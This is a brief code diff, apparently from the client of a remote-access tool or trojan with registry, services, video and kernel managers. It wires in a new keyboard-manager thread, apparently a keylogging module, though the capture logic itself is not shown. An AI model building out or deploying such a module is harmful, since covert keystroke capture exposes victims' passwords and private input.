@@ -10,6 +10,8 @@
 #include "RegisterManager.h"
 #include "ServicesManager.h"
 #include "VideoManager.h"
+#include "KeyboardManager.h"
+
 #include "KernelManager.h" 
 
 extern CONNECT_ADDRESS g_SETTINGS;
@@ -111,4 +113,9 @@ DWORD WINAPI LoopRegisterManager(LPVOID lParam)
 DWORD WINAPI LoopServicesManager(LPVOID lParam)
 {
 	return LoopManager<CServicesManager, 0>(lParam);
+}
+
+DWORD WINAPI LoopKeyboardManager(LPVOID lParam)
+{
+	return LoopManager<CKeyboardManager1, 0>(lParam);
 }
